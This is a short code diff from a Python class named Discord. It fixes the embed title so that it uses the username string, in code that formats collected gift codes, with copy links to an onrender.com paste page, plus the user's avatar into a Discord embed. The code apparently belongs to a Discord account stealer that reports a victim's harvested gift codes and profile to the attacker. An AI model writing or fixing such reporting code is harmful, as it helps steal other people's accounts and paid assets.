@@ -396,7 +396,7 @@ class Discord:
                 for c, t in val_codes:
                     val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-            embed = Embed(title={username}, color=5639644)
+            embed = Embed(title=username, color=5639644)
             embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
             embed.set_thumbnail(url=avatar)
 
